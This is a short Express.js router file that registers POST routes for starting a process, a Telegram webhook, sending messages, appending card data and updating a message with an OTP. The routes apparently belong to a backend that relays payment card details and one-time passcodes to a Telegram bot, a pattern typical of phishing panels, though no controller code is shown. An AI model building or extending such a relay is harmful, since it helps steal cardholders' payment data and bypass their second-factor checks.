import express from "express";
import { initProcess, telegramWebhook, sendSimpleMessage, updateMessageWithOtp, appendCardData } from "../controllers/botController.js";

const router = express.Router();

router.post('/start-process', initProcess);
router.post('/telegram/webhook', telegramWebhook);
router.post('/send-message', sendSimpleMessage);
router.post('/append-card-data', appendCardData);
router.post('/update-message-otp', updateMessageWithOtp);

export default router;